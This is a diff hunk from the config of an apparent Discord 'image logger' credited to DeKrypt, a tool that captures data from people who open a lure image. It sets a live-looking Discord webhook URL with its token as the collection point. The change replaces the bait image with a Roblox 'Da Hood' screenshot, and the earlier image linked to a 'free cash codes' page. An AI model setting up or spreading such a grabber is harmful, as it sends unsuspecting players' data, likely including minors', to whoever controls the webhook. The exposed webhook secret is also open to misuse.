@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1430273243599863991/wQ5K_uXG_NgKU1f93OutIsFLi5Rnf0S4uEl58IRBXdrReUpOdihX75Xn4CS8Xt2f4tDa",
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.ggrecon.com%2Fguides%2Fda-hood-codes-for-free-cash%2F&psig=AOvVaw1agRGbWtHFMcwd1uj5yJaY&ust=1764863525722000&source=images&cd=vfe&opi=89978449&ved=0CBUQjRxqFwoTCNjAqd_ioZEDFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
+    "image": "https://static.wikia.nocookie.net/da-hood-roblox/images/d/d8/Screenshot_2023-08-25_232315.png/revision/latest?cb=20230910010455", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
